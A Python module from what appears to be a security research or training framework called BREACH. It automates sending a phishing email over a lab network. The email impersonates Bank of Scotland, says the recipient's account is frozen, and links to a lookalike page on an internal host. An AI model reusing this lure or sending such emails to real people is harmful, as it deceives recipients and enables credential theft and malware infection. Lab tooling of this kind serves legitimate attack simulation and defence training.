# Copyright 2016, 2017, 2018, 2019 Fraunhofer FKIE
#
# This file is part of BREACH.
#
# BREACH is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# BREACH is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with BREACH. If not, see <http://www.gnu.org/licenses/>.


from attacks import Attack, AttackInfo, AttackOptions


class EmailURLAttackOptions(AttackOptions):
    name = "Recipient name"
    addr = "Recipient email address"
    lhost = "Reverse HTTP target host or IP address"
    lport = "Reverse HTTP target port"

    def _set_defaults(self):
        self.name = "Jane Doe"
        self.addr = "client1@localdomain"
        self.lhost = "172.18.0.3"
        self.lport = "80"


class EmailURLAttack(Attack):
    info = AttackInfo(
        name="infect_email_url",
        description="Sends an email containing an infected URL")
    options_class = EmailURLAttackOptions

    def run(self):
        with self.check_printed(indicator="Email was sent successfully"):
            self.exec_command_on_target(self._sendemail_command(self._email_body()))

    def _sendemail_command(self, message):
        return " ".join([
            "sendemail",
            "-f attacker@localdomain",
            "-t {addr}".format(addr=self.options.addr),
            "-s 172.18.0.2",
            "-u 'Frozen User Account'",
            "-m '{msg}'".format(msg=message),
            "-o tls=no",
            "-o message-content-type=html",
            "-o message-charset=UTF-8",
            ""])

    def _email_body(self):
        return (
            "<p><img src=\"http://172.18.1.1/email_header.jpg\" width=\"1100\" height=\"300\"></p>"
            "<p>Dear {name},</p>"
            "<p>our Technical Support Team unfortunately had to freeze your bank account."
            "   Please download and read the file provided in the attachment for further"
            "   information.</p>"
            "<p>We apologize for the inconvenience caused, and we are really grateful for your"
            "   collaboration. This is an automated e-mail. Please do not respond.</p>"
            "<p>For further information please visit the following Link:<br>"
            "   <a href=\"http://172.18.1.1/Bank-Of-Scotland/index.htm\">Bank Of Scotland FAQ</a>"
            "   </p>"
            "<p><img src=\"http://172.18.1.1/email_footer.jpg\" width=\"90\" height=\"90\"></p>"
            "<p>&copy; 2017 bankofscotland.co.uk. All Rights Reserved.</p>"
            "".format(name=self.options.name))
